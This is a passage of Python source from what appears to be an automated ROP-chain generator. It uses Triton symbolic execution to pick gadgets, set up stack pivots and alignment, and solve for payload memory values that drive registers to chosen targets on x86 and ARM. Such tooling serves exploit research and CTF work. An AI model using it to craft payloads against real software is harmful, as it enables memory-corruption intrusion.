                    merge_address_map[start_idx+idx-now_idx] = data
            pass
    for a, v in merge_address_map.items():
        if eval(v) in note_mem_idx_before:
            merge_address_map[a] = hex(eval(v)+_ptr_size()*(a-note_mem_idx_before[eval(v)]))

    return merge_address_map

def solve_part(gadget_chain,gadgets_info,append_constraint):
    
    address_map = gadgets_info.address_map.copy()
    offset_list = gadgets_info.offset_list.copy()
    target_reg_name = "init"
    solve_constraint = {}
    for ik in range(len(gadgets_info.target_regs)):
        solve_constraint[gadgets_info.target_regs[ik]['reg_name']] = gadgets_info.target_regs[ik]['reg_value']

    gadget_chain = gadget_chain[::-1]
    i0 = 1
    solution_mem_res = []
    address_tmp = {}
    while(i0 < len(gadget_chain)):
        op = tools.Analysis_op_dispatch(gadgets_info.gadgets_dict[gadget_chain[i0]].split(" ; ")[0])
        if type(op)!=list and op['dst']['type'] == 'mem_value':
            target_reg_name = "mem store"
        else:
            now_gadget_info = tools.Analysis_gadget_dispatch(gadgets_info.gadgets_dict[gadget_chain[i0]])
            if "xchg" not in gadgets_info.gadgets_dict[gadget_chain[i0]]:
                for i in range(len(now_gadget_info['can_change_regs'])):
                    if now_gadget_info['can_change_regs'][i]['reg_name'] in [_ for _ in solve_constraint]:
                        target_reg_name = now_gadget_info['can_change_regs'][i]['reg_name']
                        break
            else:
                for i in range(len(now_gadget_info['can_change_regs'])):
                    f = True
                    for j in range(i0+1,len(gadget_chain)):
                        g_info = tools.Analysis_gadget_dispatch(gadgets_info.gadgets_dict[gadget_chain[j]])
                        for k in range(len(g_info['can_change_regs'])):
                            if now_gadget_info['can_change_regs'][i]['reg_name'] == g_info['can_change_regs'][k]['reg_name']:
                                f = False
                                break
                        if not f:
                            break
                    if f:
                        if now_gadget_info['can_change_regs'][i]['reg_name'] in [_ for _ in solve_constraint]:
                            target_reg_name = now_gadget_info['can_change_regs'][i]['reg_name']
                            break
        append_address = []
        constraint = {}
        ctx = _create_triton_ctx()
        if ctx is None:
            return False
        ctx = init_reg(ctx, gadgets_info.regs_init)
        for reg in gadgets_info.regs_init:
            if reg not in _get_ac().skip_regs and reg != target_reg_name:
                ctx.symbolizeRegister(get_reg(ctx,reg),f"{reg}")
        address_list = []
        for addr_idx, values in address_map.items():
            if '0xdeadbeef' == values:
                address_map[addr_idx] = gadget_chain[-1]
                ctx.setConcreteMemoryAreaValue(gadgets_info.controble_addr_base+addr_idx*_ptr_size(),_p(eval(gadget_chain[0])&_addr_mask()))
            else:
                ctx.setConcreteMemoryAreaValue(gadgets_info.controble_addr_base+addr_idx*_ptr_size(),_p(eval(values)&_addr_mask()))
        
        for i in range(len(offset_list)):
            memory_access = MemoryAccess(gadgets_info.controble_addr_base + _ptr_size() * offset_list[i], _cpusize())
            address_list.append(gadgets_info.controble_addr_base + _ptr_size() * offset_list[i])
            ctx.symbolizeMemory(memory_access, f"mem_{offset_list[i]}")

        (my_virtual_mem_start, my_virtual_mem_length) = gadgets_info.my_virtual_mem_info
    
        for mem_addr in range(my_virtual_mem_start,my_virtual_mem_start+my_virtual_mem_length,_ptr_size()):
            memory_access = MemoryAccess(mem_addr, _cpusize())
            ctx.symbolizeMemory(memory_access, f"mem_{(mem_addr-gadgets_info.controble_addr_base)//_ptr_size()}")

        address = 0x400000
        for c in gadgets_info.stack_pivot_chain:
            codes = c.split(' -> ')[1].split(" ; ")
            for code in codes:
                try:
                    instruction = Instruction(address, tools.my_asm_for_triton(code))
                    ctx.processing(instruction)
                except:
                    if _get_ac().arch_name in ('arm', 'armel', 'arm32'):
                        op_info = tools.Analysis_op_dispatch(code)
                        n_pops = len(op_info) if type(op_info) == list else 1
                        sp_val = ctx.getConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg))
                        ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg), sp_val + n_pops * _ptr_size())
                    else:
                        return False
                address += len(tools.my_asm(code))
        _reset_thumb(ctx)

        now_gadget_addr = gadget_chain[i0]
        now_gadget = gadgets_info.gadgets_dict[now_gadget_addr]
        
        rip_reg_info = tools.Analysis_gadget_dispatch(now_gadget)['hijack_reg'][0]
        
        now_gadget = now_gadget.split(" ; ")
        next_gadget_addr = gadget_chain[i0-1]
        solve_constraint[_get_ac().pc_reg] = eval(next_gadget_addr)
        replace_flag = 0
        for i1 in range(len(now_gadget)):
            now_op_info = tools.Analysis_op_dispatch(now_gadget[i1])
            
            if type(now_op_info) == list:
                for i in range(len(now_op_info)):
                    if type(now_op_info[i]['dst']['reg_name']) != list and now_op_info[i]['dst']['reg_name'] in solve_constraint:
                        now_op_info = now_op_info[i]
                        break

            if type(now_op_info)!=list and now_op_info and now_op_info['src']['type'] == 'mem_value' and now_op_info['src']['reg_name'] != _get_ac().sp_reg and type(now_op_info['dst']['reg_name'])!=list and now_op_info['dst']['reg_name'] in solve_constraint:
                RegSrcMemAddress = controllable_mem_distributor(gadgets_info,address_map,now_gadget,'rip_mem')
                expr = now_op_info['src']['expr']
                offset_str = expr.split(" ")
                offset =  None
                if len(offset_str) == 1:
                    offset = 0
                else:
                    try:
                        offset = eval(offset_str[-2]+offset_str[-1])
                    except:
                        pass
                set_reg_value = (RegSrcMemAddress - offset)&_addr_mask()
                if type(now_op_info['src']['reg_name']) == list:
                    return False
                constraint[now_op_info['src']['reg_name']] = set_reg_value
                gadgets_info.used_virtual_mem[RegSrcMemAddress] = "wait"
                address_tmp[RegSrcMemAddress] = [set_reg_value,"wait"]
                ctx.setConcreteRegisterValue(get_reg(ctx,now_op_info['src']['reg_name']),set_reg_value)
                if now_op_info['src']['reg_name'] == _get_ac().bp_reg:
                    for i2 in range(i1+1,len(now_gadget)):
                        if now_gadget[i2] == 'leave':
                            predict_rsp = get_rsp(gadgets_info,now_gadget,i2)
                            constraint[_get_ac().bp_reg] = predict_rsp - offset
                            address_tmp[predict_rsp] = [predict_rsp - offset,"wait"]
                            ctx.setConcreteRegisterValue(get_reg(ctx,now_op_info['src']['reg_name']),constraint[_get_ac().bp_reg])
                            append_address.append(predict_rsp)
                            break
            if now_gadget[i1] == 'leave':
                current_rsp = ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().sp_reg))
                if _get_ac().bp_reg not in constraint:
                    constraint[_get_ac().bp_reg] = current_rsp
                    offset = constraint[_get_ac().bp_reg]-current_rsp
                    address_tmp[current_rsp] = [current_rsp,"wait"]
                    ctx.setConcreteRegisterValue(get_reg(ctx,_get_ac().bp_reg),current_rsp)
                    append_address.append(current_rsp)
            if i1 == len(now_gadget)-1:
                mem_flag = 0
                if now_gadget[i1].split(" ")[0] in ['ret','retf']:
                    now_gadget[i1] = now_gadget[i1].split(" ")[0]
                if "retf" in now_gadget[i1]:
                    now_gadget[i1] = now_gadget[i1].replace("retf","ret")
                    replace_flag = 1
                else:
                    # if (rip_reg_info['reg_name'] != 'rsp' or rip_reg_info['type'] != 'mem_value') and now_gadget[-2] != "leave":
                    if (rip_reg_info['reg_name'] != _get_ac().sp_reg or rip_reg_info['type'] != 'mem_value'):
                        if rip_reg_info['type'] == 'mem_value' and rip_reg_info['reg_name'] not in append_constraint:
                            mem_address = controllable_mem_distributor(gadgets_info,address_map,now_gadget,'rip_mem') # TODO
                            expr = rip_reg_info['expr']
                            offset_str = expr.split(" ")
                            if len(offset_str) == 1:
                                offset = 0
                            else:
                                try:
                                    offset = eval(offset_str[-2]+offset_str[-1])
                                except:
                                    offset = 0
                                    pass
                            set_reg_value = mem_address - offset
                            constraint[rip_reg_info['reg_name']] = set_reg_value
                            if rip_reg_info['reg_name'] in solve_constraint:
                                del solve_constraint[rip_reg_info['reg_name']]
                            address_tmp[mem_address] = [set_reg_value,next_gadget_addr]
                            gadgets_info.used_virtual_mem[mem_address] = next_gadget_addr
                            ctx.setConcreteRegisterValue(get_reg(ctx,rip_reg_info['reg_name']),set_reg_value)
                            mem_flag = 1
                            append_address.append(mem_address)
                        elif rip_reg_info['type'] == 'value':
                            # Register-based control flow (e.g. blx r3, bx r4)
                            # Set hijack reg to next gadget address
                            hijack_reg = rip_reg_info['reg_name']
                            constraint[hijack_reg] = eval(next_gadget_addr)
                            if hijack_reg in solve_constraint:
                                del solve_constraint[hijack_reg]
                            ctx.setConcreteRegisterValue(get_reg(ctx, hijack_reg), eval(next_gadget_addr))
            instruction = None
            if not _skip_arm_imm_branch(ctx, address, now_gadget[i1], i1 == len(now_gadget)-1):
                try:
                    instruction = Instruction(address, tools.my_asm_for_triton(now_gadget[i1]))
                    ctx.processing(instruction)
                except:
                    # ARM blx/bx may fail if target address is unmapped
                    op0 = now_gadget[i1].strip().split()[0]
                    if op0 in ('blx', 'bx'):
                        # Manually set PC to the target register value
                        target_val = ctx.getConcreteRegisterValue(get_reg(ctx, rip_reg_info['reg_name']))
                        ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().pc_reg), target_val & ~1)
                        if op0 == 'blx':
                            ctx.setConcreteRegisterValue(get_reg(ctx, 'r14'), address + len(tools.my_asm(now_gadget[i1])))
                    elif _get_ac().arch_name in ('arm', 'armel', 'arm32'):
                        _process_instruction_arm_safe(ctx, address, now_gadget[i1])
                    else:
                        raise
            if instruction is not None and not read_write_check(instruction, gadgets_info.permission_table):
                valid_mem_reg_list = tools.Analysis_gadget_dispatch(now_gadget[i1])['valid_mem_reg']
                if len(valid_mem_reg_list) != 1:
                    pass
                else:
                    valid_mem_reg_info = valid_mem_reg_list[0]
                    valid_mem_address = controllable_mem_distributor(gadgets_info,address_map,now_gadget,'valid_mem')
                    expr = valid_mem_reg_info['expr']
                    offset_str = expr.split(" ")
                    if len(offset_str) == 1:
                        offset = 0
                        set_reg_value = (valid_mem_address - offset)&_addr_mask()
                        constraint[valid_mem_reg_info['reg_name']] = set_reg_value
                        address_tmp[valid_mem_address] = [set_reg_value,"wait"]
                        # solve_res[valid_mem_reg_info['reg_name']] = set_reg_value
                        gadgets_info.bss_address += _ptr_size()
                        ctx.setConcreteRegisterValue(get_reg(ctx,valid_mem_reg_info['reg_name']),set_reg_value)
                    elif len(offset_str) == 3:
                        try:
                            offset = eval(offset_str[-2]+offset_str[-1])
                            set_reg_value = (valid_mem_address - offset)&_addr_mask()
                            constraint[valid_mem_reg_info['reg_name']] = set_reg_value
                            address_tmp[valid_mem_address] = [set_reg_value,"wait"]
                            # solve_res[valid_mem_reg_info['reg_name']] = set_reg_value
                            gadgets_info.bss_address += _ptr_size()
                            ctx.setConcreteRegisterValue(get_reg(ctx,valid_mem_reg_info['reg_name']),set_reg_value)
                        except:
                            pass
                    else:
                        pass
            address += len(tools.my_asm(now_gadget[i1]))
        ast = ctx.getAstContext()
        cons = []
        mem_constraint = {}
        if target_reg_name == 'mem store':
            solution = ctx.getModel(ctx.getRegisterAst(get_reg(ctx, _get_ac().pc_reg)) == solve_constraint[_get_ac().pc_reg])
            for name, value in solve_constraint.items():
                if name != _get_ac().pc_reg:
                    mem_constraint[name] = value
        else:
            for name, value in solve_constraint.items():
                reg_sym = ctx.getRegisterAst(get_reg(ctx, name))
                cons.append(reg_sym == value)
            if len(cons) > 1:
                con = ast.land(cons)
                solution = ctx.getModel(con)
            else:
                solution = ctx.getModel(cons[0])
        rsp_idx = (ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().sp_reg))-gadgets_info.controble_addr_base)//_ptr_size()
        solve_constraint = constraint
        
        if len(solution) == 0:
            return False
        
        for name, value in mem_constraint.items():
            solve_constraint[name] = value
        
        mem_solution = {}
        for k,v in solution.items():
            variables = str(v.getVariable()).split(':')[0]
            value = v.getValue()
            
            if "mem" in variables:
                if replace_flag == 1 and "0x"+hex(value)[2:].zfill(_get_ac().addr_format_width) in gadgets_info.gadgets_dict:
                    cs = ctx.getConcreteRegisterValue(get_reg(ctx,'cs'))
                    idxx = int(str(v.getVariable()).split("_")[1].split(':')[0])
                    mem_solution[idxx] = f"{hex(v.getValue()|(cs<<32))}"
                else:
                    idxx = int(str(v.getVariable()).split("_")[1].split(':')[0])
                    mem_solution[idxx] = f"{hex(v.getValue())}"
            else:
                solve_constraint[variables] = value

        i0 += 1
        for ii in range(len(append_address)):
            address_tmp[append_address[ii]].append(mem_solution)
        
        if len(mem_solution) != 0:
            if rsp_idx > max(mem_solution):
                for i2 in range(max(mem_solution)+1,rsp_idx):
                    mem_solution[i2] = "0x0"
            else:
                if ctx.isRegisterSymbolized(get_reg(ctx,_get_ac().pc_reg)):
                    mem_solution = stack_alignment(gadgets_info,mem_solution,rsp_idx)
                    if not mem_solution:
                        return False
        solution_mem_res.append(mem_solution)
        pass
    solution_mem_res = solution_mem_res[::-1]
    
    start_idx = max(address_map, key=lambda k: address_map[k]) + 1
    data_mem = {}
    offset_dict = {}
    for so in solution_mem_res:
        offset = max(address_map) + 1
        offset_dict[str(so)] = offset
        for idx,v in so.items():
            if idx >= ((gadgets_info.my_virtual_mem_info[0]-gadgets_info.controble_addr_base))//8:
                data_mem[idx] = v
            else:
                address_map[idx-start_idx+offset] = v

    for a, v in address_map.items():
        if addr_in_range(v,gadgets_info.controllable_mem_data):
            for addr, set_reg_and_value in address_tmp.items():
                if len(set_reg_and_value)!=3:
                    continue
                set_reg_v = set_reg_and_value[0]
                value = set_reg_and_value[1]
                so = set_reg_and_value[2]
                if eval(v) == set_reg_v:
                    address_map[a] = hex(eval(v)+(offset_dict[str(so)]-start_idx)*8)
                    break
    for d in data_mem:
        address_map[d] = data_mem[d]

    return (address_map,solve_constraint)

def stack_alignment(gadgets_info,mem_solution,current_rsp_idx):
    mem_solution = dict(sorted(mem_solution.items()))
    mem_start = gadgets_info.offset_list[0]
    if current_rsp_idx > mem_start:
        mem_start = current_rsp_idx

    change_sp_gadget = gadgets_info.change_sp_gadget
    my_virtual_mem_start_idx = (gadgets_info.my_virtual_mem_info[0]-gadgets_info.controble_addr_base)//_ptr_size()
    max_idx = 0
    for i in mem_solution:
        if i > max_idx and i < my_virtual_mem_start_idx:
            max_idx = i
    f = False
    while mem_start < max_idx:
        tmp_max = 0
        next_max = 0
        for j in mem_solution:
            if j > mem_start:
                if j > tmp_max and j < my_virtual_mem_start_idx:
                    tmp_max = j
                    break
        for j in mem_solution:
            if j > tmp_max and j < my_virtual_mem_start_idx:
                if j-tmp_max == 1:
                    next_max = j
                else:
                    break
        if next_max == 0:
            need_add = 1*_ptr_size() + _ptr_size()
        else:
            need_add = (next_max - tmp_max + 1 + 1)*_ptr_size()
        while tmp_max-1 > mem_start:
            for k in range(len(change_sp_gadget)):
                if change_sp_gadget[k]['change'] == _ptr_size():
                    break
            mem_solution[mem_start] = change_sp_gadget[k]['addr']
            mem_start += 1
        for j in range(len(change_sp_gadget)):
            if change_sp_gadget[j]['change'] == need_add:
                mem_solution[mem_start]= change_sp_gadget[j]['addr']
                mem_start += (need_add//_ptr_size())
                f = True
                break
        if f == False:
            return f
        f = False
    return mem_solution

def addr_in_range(addr,mem_dict_list):
    addr_n = eval(addr)
    for i in range(len(mem_dict_list)):
        start_addr = eval(mem_dict_list[i]['start_addr'])
        length = mem_dict_list[i]['length']
        if addr_n >= start_addr and addr_n <= start_addr+length:
            return True
    return False
def get_reg_name(str):
    general_purpose = _get_ac().general_purpose
    for r in general_purpose:
        if r in str:
            return r
def get_rsp(gadgets_info,gadget_list,stop_idx):
    ctx = _create_triton_ctx()
    if ctx is None:
        return False
    ctx = init_reg(ctx, gadgets_info.regs_init)
    address = 0x400000
    for c in gadgets_info.stack_pivot_chain:
        codes = c.split(' -> ')[1].split(" ; ")
        for code in codes:
            _process_instruction_arm_safe(ctx, address, code)
            address += len(tools.my_asm(code))
    _reset_thumb(ctx)
    codes = gadget_list
    for c in range(stop_idx):
        instruction = Instruction(address, tools.my_asm_for_triton(codes[c]))
        ctx.processing(instruction)
        address += len(tools.my_asm(codes[c]))
    end_rsp = ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().sp_reg))
    return end_rsp
def search_solve(gadget,target_reg,target_value,gadgets_info):
    solve_res = {}
    gadget_list = gadget.split(" ; ")
    # ARM: pop {pc} clears bit 0, so PC constraint must be even
    _deadbeef = 0xdeadbeee if _get_ac().arch_name in ('arm','armel','arm32') else 0xdeadbeef
    constraint = {target_reg:target_value,_get_ac().pc_reg:_deadbeef}
    address_map = gadgets_info.address_map.copy()
    offset_list = gadgets_info.offset_list.copy()
    rip_reg_info = tools.Analysis_gadget_dispatch(gadget)['hijack_reg'][0]

    ctx = _create_triton_ctx()
    if ctx is None:
        return False
    ctx = init_reg(ctx, gadgets_info.regs_init)
    for reg in gadgets_info.regs_init:
        if reg not in _get_ac().skip_regs and reg != target_reg:
            r = get_reg(ctx, reg)
            if r is not None:
                ctx.symbolizeRegister(r, f"{reg}")
    address_list = []
    for addr_idx, values in address_map.items():
        val = eval(values) & _addr_mask()
        # ARM: clear bit 0 to prevent THUMB mode switch during pivot
        if _get_ac().arch_name in ('arm', 'armel', 'arm32'):
            val &= ~1
        ctx.setConcreteMemoryAreaValue(gadgets_info.controble_addr_base+addr_idx*_ptr_size(),_p(val))
    for i in range(len(offset_list)):
        memory_access = MemoryAccess(gadgets_info.controble_addr_base + _ptr_size() * offset_list[i], _cpusize())
        address_list.append(gadgets_info.controble_addr_base + _ptr_size() * offset_list[i])
        ctx.symbolizeMemory(memory_access, f"mem_{offset_list[i]}")

    (my_virtual_mem_start, my_virtual_mem_length) = gadgets_info.my_virtual_mem_info

    for mem_addr in range(my_virtual_mem_start,my_virtual_mem_start+my_virtual_mem_length,_ptr_size()):
        memory_access = MemoryAccess(mem_addr, _cpusize())
        ctx.symbolizeMemory(memory_access, f"mem_{(mem_addr-gadgets_info.controble_addr_base)//_ptr_size()}")

    address = 0x400000
    for c in gadgets_info.stack_pivot_chain:
        codes = c.split(' -> ')[1].split(" ; ")
        for code in codes:
            try:
                instruction = Instruction(address, tools.my_asm_for_triton(code))
                ctx.processing(instruction)
                address += len(tools.my_asm(code))
            except:
                # ARM: pop {pc} fails when loaded PC points to unmapped memory.
                # Manually advance SP past the slot consumed by the failed instruction.
                if _get_ac().arch_name in ('arm', 'armel', 'arm32'):
                    op_info = tools.Analysis_op_dispatch(code)
                    if op_info is not None:
                        n_pops = len(op_info) if type(op_info) == list else 1
                        sp_val = ctx.getConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg))
                        ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg), sp_val + n_pops * _ptr_size())
                    address += len(tools.my_asm(code))
                else:
                    return {}
    _reset_thumb(ctx)
    for i1 in range(len(gadget_list)):
        now_op_info = tools.Analysis_op_dispatch(gadget_list[i1])
        if type(now_op_info) == list:
            for i in range(len(now_op_info)):
                if now_op_info[i]['dst']['reg_name'] == target_reg:
                    now_op_info = now_op_info[i]
                    break
        if now_op_info and type(now_op_info)!=list and "0x" in (now_op_info['src']['reg_name']):
            return {}
        if type(now_op_info)!=list and now_op_info and now_op_info['src']['reg_name'] != [] and now_op_info['src']['type'] == 'mem_value' and now_op_info['src']['reg_name'] != _get_ac().sp_reg and now_op_info['dst']['reg_name'] == target_reg:
            RegSrcMemAddress = controllable_mem_distributor(gadgets_info,address_map,gadget_list,'rip_mem')
            expr = now_op_info['src']['expr']
            offset_str = expr.split(" ")
            offset =  None
            if len(offset_str) == 1:
                offset = 0
            elif len(offset_str) == 3:
                try:
                    offset = eval(offset_str[-2]+offset_str[-1])
                except:
                    return {}
            else:
                return {}
            set_reg_value = (RegSrcMemAddress - offset)&_addr_mask()
            # constraint[now_op_info['src']['reg_name']] = set_reg_value
            solve_res[now_op_info['src']['reg_name']] = set_reg_value
            gadgets_info.used_virtual_mem[RegSrcMemAddress] = "wait"
            ctx.setConcreteRegisterValue(get_reg(ctx,now_op_info['src']['reg_name']),set_reg_value)
            if now_op_info['src']['reg_name'] == _get_ac().bp_reg:
                for i2 in range(i1+1,len(gadget_list)):
                    if gadget_list[i2] == 'leave':
                        predict_rsp = get_rsp(gadgets_info,gadget_list,i2)
                        # current_rsp_old = ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().sp_reg))
                        solve_res[_get_ac().bp_reg] = predict_rsp - offset
                        # constraint[_get_ac().bp_reg] = predict_rsp - offset
                        ctx.setConcreteRegisterValue(get_reg(ctx,now_op_info['src']['reg_name']),solve_res[_get_ac().bp_reg])
                        break
        if gadget_list[i1] == 'leave':
            current_rsp = ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().sp_reg))
            if _get_ac().bp_reg not in solve_res:
                solve_res[_get_ac().bp_reg] = current_rsp - _ptr_size()
                ctx.setConcreteRegisterValue(get_reg(ctx,_get_ac().bp_reg),current_rsp-_ptr_size())
            
        if i1 == len(gadget_list)-1:
            mem_flag = 0
            if "retf" in gadget_list[i1]:
                gadget_list[i1] = gadget_list[i1].replace("retf","ret")
                replace_flag = 1
            else:
                if rip_reg_info['reg_name'] != _get_ac().sp_reg or rip_reg_info['type'] != 'mem_value':
                    if rip_reg_info['type'] == 'mem_value' and rip_reg_info['reg_name'] not in constraint:
                        mem_address = controllable_mem_distributor(gadgets_info,address_map,gadget,'rip_mem') # TODO
                        expr = rip_reg_info['expr']
                        offset_str = expr.split(" ")
                        if len(offset_str) == 1:
                            offset = 0
                        elif len(offset_str) == 3:
                            try:
                                offset = eval(offset_str[-2]+offset_str[-1])
                            except:
                                if offset_str[0] == rip_reg_info['reg_name']:
                                    r_n = get_reg_name(offset_str[-1])
                                    r_n_v = ctx.getConcreteRegisterValue(get_reg(ctx,r_n))
                                    exec(f"{r_n}={r_n_v}")
                                    try:
                                        offset = eval(offset_str[-2]+offset_str[-1])&_addr_mask()
                                    except:
                                        return {}
                                else:
                                    return {}
                        else:
                            return {}
                        set_reg_value = (mem_address - offset)&_addr_mask()
                        constraint[rip_reg_info['reg_name']] = set_reg_value
                        solve_res[rip_reg_info['reg_name']] = set_reg_value
                        gadgets_info.used_virtual_mem[mem_address] = 0xdeadbeef
                        ctx.setConcreteRegisterValue(get_reg(ctx,rip_reg_info['reg_name']),set_reg_value)
                        mem_flag = 1
                    elif rip_reg_info['type'] == 'value':
                        pass
        try:
            instruction = Instruction(address, tools.my_asm_for_triton(gadget_list[i1]))
            ctx.processing(instruction)
        except:
            # Triton failed to disassemble (e.g. conditional Thumb2 with stripped condition)
            # Use _process_instruction_arm_safe fallback
            instruction = _process_instruction_arm_safe(ctx, address, gadget_list[i1])
            if instruction is None:
                # Cannot process this instruction at all — skip this gadget
                return {}
        if not read_write_check(instruction, gadgets_info.permission_table):
            valid_mem_reg_list = tools.Analysis_gadget_dispatch(gadget_list[i1])['valid_mem_reg']
            if len(valid_mem_reg_list) != 1:
                return {}
            else:
                valid_mem_reg_info = valid_mem_reg_list[0]
                valid_mem_address = controllable_mem_distributor(gadgets_info,address_map,gadget,'valid_mem')
                expr = valid_mem_reg_info['expr']
                offset_str = expr.split(" ")
                if len(offset_str) == 1:
                    offset = 0
                    set_reg_value = (valid_mem_address - offset)&_addr_mask()
                    constraint[valid_mem_reg_info['reg_name']] = set_reg_value
                    solve_res[valid_mem_reg_info['reg_name']] = set_reg_value
                    gadgets_info.bss_address += _ptr_size()
                    ctx.setConcreteRegisterValue(get_reg(ctx,valid_mem_reg_info['reg_name']),set_reg_value)
                elif len(offset_str) == 3:
                    try:
                        offset = eval(offset_str[-2]+offset_str[-1])
                        set_reg_value = (valid_mem_address - offset)&_addr_mask()
                        constraint[valid_mem_reg_info['reg_name']] = set_reg_value
                        solve_res[valid_mem_reg_info['reg_name']] = set_reg_value
                        gadgets_info.bss_address += _ptr_size()
                        ctx.setConcreteRegisterValue(get_reg(ctx,valid_mem_reg_info['reg_name']),set_reg_value)
                    except:
                        return {}
                else:
                    return {}
        address += len(tools.my_asm(gadget_list[i1]))
    ast = ctx.getAstContext()
    cons = []
    for name, value in constraint.items():
        reg_sym = ctx.getRegisterAst(get_reg(ctx, name))
        cons.append(reg_sym == value)
    con = ast.land(cons)
    solution = ctx.getModel(con)
    if len(solution) > 0:
        for k,v in solution.items():
            variables = str(v.getVariable()).split(':')[0]
            value = v.getValue()
            solve_res[variables] = value
        return solve_res
    else:
        return solution

def table_check(addr, permission_table, mode):
    for i in range(len(permission_table)):
        # print(f"{hex(addr)} {hex(permission_table[i]['start'])} {hex(permission_table[i]['end'])} {addr > permission_table[i]['start'] and addr < permission_table[i]['end']}")
        if addr >= permission_table[i]['start'] and addr < permission_table[i]['end']:
            if mode not in permission_table[i]['permission']:
                return False
    return True

def read_write_check(instruction, permission_table):
    if instruction.isMemoryRead():
        a = instruction.getLoadAccess()
        readMemory = a[0][0].getAddress()
        if not table_check(readMemory, permission_table, 'r'):
            return False
    if instruction.isMemoryWrite():
        b = instruction.getStoreAccess()
        writeMemory = b[0][0].getAddress()
        if not table_check(writeMemory, permission_table, 'w'):
            return False
    return True
def resolve(gadgets_info, solve_res, cmp_solve = None):
    ctx = _create_triton_ctx()
    if ctx is None:
        return False
    ctx = init_reg(ctx, gadgets_info.regs_init)
    
    controble_addr_base = gadgets_info.controble_addr_base
    stack_pivot_chain = gadgets_info.stack_pivot_chain
    target_reg_value = gadgets_info.target_regs
    if type(cmp_solve)!=dict:
        for addr_idx, values in solve_res.items():
            process_value = eval(values)
            if process_value >> 32 == gadgets_info.regs_init.get('cs', 0):
                process_value = process_value&0xffffffff
            if "0x"+hex(process_value)[2:].zfill(_get_ac().addr_format_width) in gadgets_info.gadgets_dict:
                ctx.setConcreteMemoryAreaValue(controble_addr_base+addr_idx*_ptr_size(),_p(eval(values)&_addr_mask()))
            else:
                if process_value >= controble_addr_base:
                    ctx.setConcreteMemoryAreaValue(controble_addr_base+addr_idx*_ptr_size(),_p(eval(values)&_addr_mask()))
                else:
                    memory_access = MemoryAccess(gadgets_info.controble_addr_base + _ptr_size() * addr_idx, _cpusize())
                    ctx.symbolizeMemory(memory_access, f"mem_{addr_idx}")
                    logger.debug(f"{addr_idx} {values}")
    else:
        for addr_idx, values in solve_res.items():
            if addr_idx not in cmp_solve:
                ctx.setConcreteMemoryAreaValue(controble_addr_base+addr_idx*_ptr_size(),_p(eval(values)&_addr_mask()))
                continue
            process_value = eval(values)
            process_value_cmp = eval(cmp_solve[addr_idx])
            if process_value == process_value_cmp:
                if process_value >> 32 == gadgets_info.regs_init.get('cs', 0):
                    process_value = process_value&0xffffffff
                ctx.setConcreteMemoryAreaValue(controble_addr_base+addr_idx*_ptr_size(),_p(eval(values)&_addr_mask()))
            else:
                memory_access = MemoryAccess(gadgets_info.controble_addr_base + _ptr_size() * addr_idx, _cpusize())
                ctx.symbolizeMemory(memory_access, f"mem_{addr_idx}")
                logger.debug(f"{addr_idx} {values}")

    address = 0x400000
    for c in stack_pivot_chain:
        codes = c.split(' -> ')[1].split(" ; ")
        for code in codes:
            
            _process_instruction_arm_safe(ctx, address, code)
            address += len(tools.my_asm(code))
    _reset_thumb(ctx)
    front_address = 0
    old_front_address = 0
    c = 0
    history_gadget = {}
    f = False
    while(1): 
        rip = ctx.getConcreteRegisterValue(get_reg(ctx,_get_ac().pc_reg))
        if _get_ac().bits == 64 and get_reg(ctx,'cs') is not None:
            if rip>>32 == ctx.getConcreteRegisterValue(get_reg(ctx,'cs')):
                rip = rip&0xffffffff
        if rip not in history_gadget:
            history_gadget[rip] = 1
        else:
            history_gadget[rip] += 1
        for g, n in history_gadget.items():
            if n>=20:
                f = True
                break
        if f:break
        if rip == front_address:
            c += 1
            if c >= 20:
                break
        else:
            old_front_address = front_address
            front_address = rip
        try:
            next_gadget = gadgets_info.gadgets_dict["0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width)]
        except:
            break
        address = rip
        if _get_ac().arch_name not in ('arm', 'armel', 'arm32'):
            next_gadget = next_gadget.replace("retf","ret")
        next_gadget = next_gadget.split(" ; ")
        for k in range(len(next_gadget)):
            if _get_ac().arch_name not in ('arm', 'armel', 'arm32'):
                if next_gadget[k].split(" ")[0] in ["ret","retf"]:
                    next_gadget[k] = "ret"
            if not _skip_arm_imm_branch(ctx, address, next_gadget[k], k == len(next_gadget)-1):
                try:
                    instruction = Instruction(address, tools.my_asm_for_triton(next_gadget[k]))
                    ctx.processing(instruction)
                except:
                    if _get_ac().arch_name in ('arm', 'armel', 'arm32'):
                        _process_instruction_arm_safe(ctx, address, next_gadget[k])
                    else:
                        return (False,"0x"+hex(rip)[2:].zfill(_get_ac().addr_format_width))
            _reset_thumb(ctx)
            address += len(tools.my_asm(next_gadget[k]))
    ast = ctx.getAstContext()
    cons = []
    for r in range(len(target_reg_value)):
        name = target_reg_value[r]['reg_name']
        value = target_reg_value[r]['reg_value']
        reg_sym = ctx.getRegisterAst(get_reg(ctx, name))
        cons.append(reg_sym == value)
    if len(cons) > 1:
        con = ast.land(cons)
        solution = ctx.getModel(con)
    else:
        solution = ctx.getModel(cons[0])
    # print(solution)
    if len(solution) > 0:
        for k,v in solution.items():
            variables = str(v.getVariable()).split(':')[0].split("_")[1]
            value = v.getValue()
            solve_res[eval(variables)] = str(value)
        return solve_res
    else:
        return False
def check_address_rw(gadgets_info,address):
    permission_table = gadgets_info.permission_table
    for i in range(len(permission_table)):
        start = permission_table[i]['start']
        end = permission_table[i]['end']
        permission = permission_table[i]['permission']
        if address >= start and address < end and "rw" in permission:
            return True
    return False
def resolve_mem_write(gadgets_info, solve_res, mem_dst_idx, mem_dst_value):
    ctx = _create_triton_ctx()
    if ctx is None:
        return False
    ctx = init_reg(ctx, gadgets_info.regs_init)
    
    controble_addr_base = gadgets_info.controble_addr_base
    stack_pivot_chain = gadgets_info.stack_pivot_chain
    target_reg_value = gadgets_info.target_regs
    address_list = []
    for r in range(len(target_reg_value)):
        for addr, v in target_reg_value[r].items():
            memory_access = MemoryAccess(addr, len(v))
            address_list.append(memory_access)
    for addr_idx, values in solve_res.items():
